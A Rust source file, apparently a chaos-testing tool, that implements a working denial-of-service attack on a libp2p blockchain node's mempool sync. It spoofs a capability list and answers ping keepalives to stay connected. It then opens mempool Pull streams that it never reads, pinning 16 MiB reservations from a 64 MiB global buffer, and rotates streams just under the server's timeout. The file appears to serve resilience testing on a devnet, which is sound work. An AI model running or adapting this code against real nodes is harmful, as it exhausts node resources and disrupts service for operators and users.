//! Anonymous mempool-pull aggressor for the devnet-chaos lane (C17 composition).
//!
//! A minimal, fully hand-driven libp2p client: TCP + noise (XX) + yamux, then
//! N `/noid/mainnet/860e70453390bf81/1/sync/mempool/4` request-response
//! streams each sending the 12-byte `Pull` request ("NMR3" magic) — after
//! which the streams are parked and NEVER read. A non-reading client is
//! exactly what a yamux peer that stops reading looks like once its ~256 KiB
//! stream window fills; the server-side mempool response write then stalls
//! holding its unconditional MAX_MEMPOOL_SYNC_BYTES (16 MiB) reservation from
//! the process-global 64 MiB outbound domain.
//!
//! Rotation: every `--rotate-secs` (default 24, below the server's 30 s
//! inbound timeout) the parked set is replaced with fresh streams so the
//! server never sees a gap in stalled writes.
//!
//! It answers `/ipfs/ping/1.0.0` echo requests so the victim's ping keepalive
//! does not tear the connection down. No profile exchange is performed and no
//! credentials are used anywhere; mempool serving is not gated on either.

use std::future::Future;
use std::time::{Duration, Instant};

use anyhow::{bail, Context, Result};
use futures::future::poll_fn;
use futures::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt, FutureExt};
use libp2p_core::upgrade::OutboundConnectionUpgrade;
use libp2p_identity::ed25519;
use tokio_util::compat::TokioAsyncReadCompatExt;

const MEMPOOL_PROTOCOL: &str = "/noid/mainnet/860e70453390bf81/1/sync/mempool/4";
const PING_PROTOCOL: &str = "/ipfs/ping/1.0.0";
const IDENTIFY_PROTOCOL: &str = "/ipfs/id/1.0.0";
const PREFIX: &str = "/noid/mainnet/860e70453390bf81/1";

/// The network-v7 protocol set the node requires a peer to advertise before
/// it keeps the endpoint open (noid_p2p/src/network.rs:6658-6680). We
/// advertise the complete honest list: this aggressor claims exactly the
/// capabilities of a real node and then simply never reads.
fn advertised_protocols() -> Vec<String> {
    let mut list = vec![
        PING_PROTOCOL.to_string(),
        IDENTIFY_PROTOCOL.to_string(),
        "/ipfs/id/push/1.0.0".to_string(),
    ];
    for suffix in [
        "/sync/profile/6",
        "/sync/objects/2",
        "/sync/availability/1",
        "/sync/headers/5",
        "/sync/headers/4",
        "/sync/history-step/1",
        "/sync/fork-origin/1",
        "/sync/manifest/7",
        "/sync/manifest-page/1",
        "/sync/segment/7",
        "/sync/mempool/4",
        "/sync/mempool/3",
    ] {
        list.push(format!("{PREFIX}{suffix}"));
    }
    list.push(format!("{PREFIX}/kad/1.0.0"));
    list
}

/// Minimal libp2p Identify protobuf: repeated `protocols` strings (field 4,
/// wire type 2 => tag 0x22) plus protocolVersion (field 5) and agentVersion
/// (field 6). Nothing else is required by the capability check.
fn identify_response_bytes() -> Vec<u8> {
    let mut out = Vec::new();
    let mut push_string = |tag: u8, value: &str| {
        out.push(tag);
        write_varint(&mut out, value.len());
        out.extend_from_slice(value.as_bytes());
    };
    for protocol in advertised_protocols() {
        push_string(0x22, &protocol);
    }
    push_string(0x2A, "ipfs/0.1.0");
    push_string(0x32, "devnet-chaos-anon/1.0");
    out
}
/// "NMR3" + kind 0 (Pull) + 3 reserved zero bytes + u32 LE payload length 0.
const MEMPOOL_PULL_REQUEST: [u8; 12] = [
    b'N', b'M', b'R', b'3', 0, 0, 0, 0, 0, 0, 0, 0,
];

fn write_varint(buf: &mut Vec<u8>, mut value: usize) {
    loop {
        let mut byte = (value & 0x7f) as u8;
        value >>= 7;
        if value != 0 {
            byte |= 0x80;
        }
        buf.push(byte);
        if value == 0 {
            break;
        }
    }
}

/// Read one multistream-select 1.0 message: uvarint length prefix, then
/// exactly that many bytes (payload includes the trailing newline, which is
/// stripped).
async fn read_message<T: AsyncRead + Unpin>(io: &mut T) -> Result<String> {
    let mut length = 0usize;
    let mut shift = 0u32;
    loop {
        let mut byte = [0u8; 1];
        io.read_exact(&mut byte).await?;
        length |= ((byte[0] & 0x7f) as usize) << shift;
        if byte[0] & 0x80 == 0 {
            break;
        }
        shift += 7;
    }
    if length == 0 || length > 4096 {
        bail!("multistream message length out of range: {length}");
    }
    let mut buffer = vec![0u8; length];
    io.read_exact(&mut buffer).await?;
    if buffer.last() == Some(&b'\n') {
        buffer.pop();
    }
    Ok(String::from_utf8_lossy(&buffer).into_owned())
}

/// multistream-select 1.0 dialer negotiation: send header + proposal eagerly,
/// expect the header then the echo.
async fn negotiate_outbound<T: AsyncRead + AsyncWrite + Unpin>(
    io: &mut T,
    protocol: &str,
) -> Result<()> {
    let mut message = Vec::new();
    write_varint(&mut message, "/multistream/1.0.0\n".len());
    message.extend_from_slice(b"/multistream/1.0.0\n");
    write_varint(&mut message, protocol.len() + 1);
    message.extend_from_slice(protocol.as_bytes());
    message.push(b'\n');
    io.write_all(&message).await?;
    io.flush().await?;
    let header = read_message(io).await?;
    if header != "/multistream/1.0.0" {
        bail!("unexpected multistream header: {header:?}");
    }
    let echoed = read_message(io).await?;
    if echoed != protocol {
        bail!("protocol {protocol} not accepted: {echoed:?}");
    }
    Ok(())
}

/// multistream-select 1.0 listener negotiation for one inbound stream.
async fn negotiate_inbound<T: AsyncRead + AsyncWrite + Unpin>(
    io: &mut T,
    supported: &[&str],
) -> Result<Option<String>> {
    let header = read_message(io).await?;
    if header != "/multistream/1.0.0" {
        bail!("unexpected inbound multistream header: {header:?}");
    }
    let proposal = read_message(io).await?;
    let mut message = Vec::new();
    write_varint(&mut message, "/multistream/1.0.0\n".len());
    message.extend_from_slice(b"/multistream/1.0.0\n");
    match supported.iter().find(|p| **p == proposal) {
        Some(protocol) => {
            write_varint(&mut message, protocol.len() + 1);
            message.extend_from_slice(protocol.as_bytes());
            message.push(b'\n');
            io.write_all(&message).await?;
            io.flush().await?;
            Ok(Some((*protocol).to_string()))
        }
        None => {
            write_varint(&mut message, 3);
            message.extend_from_slice(b"na\n");
            io.write_all(&message).await?;
            io.flush().await?;
            Ok(None)
        }
    }
}

type PlainIo = tokio_util::compat::Compat<tokio::net::TcpStream>;
type NoiseIo = libp2p_noise::Output<PlainIo>;
type YamuxConnection = yamux::Connection<NoiseIo>;

/// Poll the yamux connection (accepting/handling inbound streams) while an
/// unrelated future that depends on connection progress runs to completion.
/// Stream negotiation and writes only complete when the connection is polled,
/// so every step during the attack runs through this wrapper.
async fn conn_aware<F>(connection: &mut YamuxConnection, mut fut: F) -> Result<F::Output>
where
    F: Future + Unpin,
{
    poll_fn(move |cx| {
        loop {
            match connection.poll_next_inbound(cx) {
                std::task::Poll::Ready(Some(stream)) => {
                    tokio::spawn(async move {
                        let Ok(mut stream) = stream else {
                            return;
                        };
                        let supported = [PING_PROTOCOL, IDENTIFY_PROTOCOL, MEMPOOL_PROTOCOL];
                        if let Ok(Some(protocol)) =
                            negotiate_inbound(&mut stream, &supported).await
                        {
                            if protocol == PING_PROTOCOL {
                                let mut buffer = [0u8; 32];
                                while stream.read_exact(&mut buffer).await.is_ok() {
                                    if stream.write_all(&buffer).await.is_err() {
                                        break;
                                    }
                                    if stream.flush().await.is_err() {
                                        break;
                                    }
                                }
                            } else if protocol == IDENTIFY_PROTOCOL {
                                // Identify: the listener pushes the response
                                // immediately; the node's capability check
                                // (network.rs:6658-6680) reads this list.
                                let response = identify_response_bytes();
                                let _ = stream.write_all(&response).await;
                                let _ = stream.flush().await;
                                let _ = stream.close().await;
                            } else {
                                // Any other inbound stream is parked, unread.
                                futures::future::pending::<()>().await;
                            }
                        }
                    });
                    continue;
                }
                std::task::Poll::Ready(None) => {
                    return std::task::Poll::Ready(Err(anyhow::anyhow!(
                        "yamux connection closed by remote"
                    )))
                }
                std::task::Poll::Pending => break,
            }
        }
        fut.poll_unpin(cx).map(Ok)
    })
    .await
}

/// Negotiate the mempool-sync protocol on one stream, send the 12-byte Pull
/// request, HALF-CLOSE the write side (the server's codec requires request
/// EOF via `ensure_eof` before it will admit the pull — an honest libp2p
/// request-response client closes its send half the same way), then hand the
/// stream back for parking. The read half is never read again: no yamux
/// window credit is ever granted, which is exactly a peer that stopped
/// reading once its ~256 KiB stream window filled.
async fn issue_pull(mut stream: yamux::Stream) -> Result<yamux::Stream> {
    negotiate_outbound(&mut stream, MEMPOOL_PROTOCOL).await?;
    stream.write_all(&MEMPOOL_PULL_REQUEST).await?;
    stream.flush().await?;
    stream.close().await?;
    Ok(stream)
}

#[tokio::main(flavor = "current_thread")]
async fn main() -> Result<()> {
    let mut args: Vec<String> = std::env::args().skip(1).collect();
    let addr = args
        .first()
        .cloned()
        .context("usage: anon-mempool-pin 127.0.0.1:PORT [--streams N] [--rotate-secs S] [--duration-secs D] [--label L]")?;
    args.remove(0);
    let mut streams_per_rotation = 4usize;
    let mut rotate_secs = 24u64;
    let mut duration_secs = 60u64;
    let mut stagger_ms = 300u64;
    let mut label = String::from("anon");
    while !args.is_empty() {
        let flag = args.remove(0);
        let value = args.first().cloned().context("flag missing value")?;
        args.remove(0);
        match flag.as_str() {
            "--streams" => streams_per_rotation = value.parse()?,
            "--rotate-secs" => rotate_secs = value.parse()?,
            "--duration-secs" => duration_secs = value.parse()?,
            "--stagger-ms" => stagger_ms = value.parse()?,
            "--label" => label = value,
            other => bail!("unknown flag {other}"),
        }
    }

    let started = Instant::now();
    let tcp = tokio::net::TcpStream::connect(&addr)
        .await
        .with_context(|| format!("connect {addr}"))?;
    let mut plain = tcp.compat();
    negotiate_outbound(&mut plain, "/noise").await?;
    let identity = libp2p_identity::Keypair::from(ed25519::Keypair::generate());
    let noise = libp2p_noise::Config::new(&identity)?;
    let (_remote_peer_id, noise_io) = noise.upgrade_outbound(plain, "/noise").await?;
    let mut noise_io = noise_io;
    negotiate_outbound(&mut noise_io, "/yamux/1.0.0").await?;
    println!(
        "[{label}] transport up (noise+yamux) to {addr} in {:?}",
        started.elapsed()
    );

    let mut connection =
        yamux::Connection::new(noise_io, yamux::Config::default(), yamux::Mode::Client);
    let mut parked: Vec<yamux::Stream> = Vec::new();
    let mut rotations = 0usize;
    let mut inbound_accepted = 0usize;
    let mut next_rotate = Instant::now();

    while started.elapsed() < Duration::from_secs(duration_secs) {
        if Instant::now() >= next_rotate {
            let t0 = Instant::now();
            for index in 0..streams_per_rotation {
                let stream = match poll_fn(|cx| connection.poll_new_outbound(cx)).await {
                    Ok(stream) => stream,
                    Err(error) => {
                        println!(
                            "[{label}] rotation {rotations} stream {index}: yamux open failed: {error:?}",
                        );
                        return Err(error.into());
                    }
                };
                let mut issue = Box::pin(issue_pull(stream));
                let stream = match conn_aware(&mut connection, &mut issue).await {
                    Ok(Ok(stream)) => stream,
                    Ok(Err(error)) => {
                        println!(
                            "[{label}] rotation {rotations} stream {index}: pull issue failed: {error:?}",
                        );
                        return Err(error);
                    }
                    Err(error) => {
                        println!(
                            "[{label}] rotation {rotations} stream {index}: connection ended mid-issue: {error:?}",
                        );
                        return Err(error);
                    }
                };
                println!(
                    "[{label}] rotation {rotations} stream {index}: pull sent and parked",
                );
                parked.push(stream);
                // The server admits one mempool preparation at a time; a short
                // stagger lets each pull claim its 16 MiB reservation before
                // the next arrives (simultaneous arrivals are dropped).
                if stagger_ms > 0 {
                    let mut sleep = Box::pin(tokio::time::sleep(Duration::from_millis(stagger_ms)));
                    conn_aware(&mut connection, &mut sleep).await?;
                }
            }
            rotations += 1;
            println!(
                "[{label}] rotation {rotations}: {streams_per_rotation} mempool pulls issued in {:?} (parked total {})",
                t0.elapsed(),
                parked.len()
            );
            if parked.len() > 4 * streams_per_rotation {
                let excess = parked.len() - 4 * streams_per_rotation;
                parked.drain(..excess);
            }
            next_rotate += Duration::from_secs(rotate_secs);
        }

        // Wait until the next rotation while driving the connection.
        let drive = conn_aware(&mut connection, futures::future::pending::<()>());
        tokio::select! {
            result = drive => {
                if let Err(error) = result {
                    println!(
                        "[{label}] connection ended after {:?}: {error}",
                        started.elapsed()
                    );
                    break;
                }
            }
            _ = tokio::time::sleep_until(tokio::time::Instant::from_std(next_rotate)) => {}
        }
        inbound_accepted += 1; // drive cycle completed without closure
    }

    println!(
        "[{label}] done after {:?}: rotations={rotations} parked_streams={} drive_cycles={inbound_accepted}",
        started.elapsed(),
        parked.len()
    );
    Ok(())
}
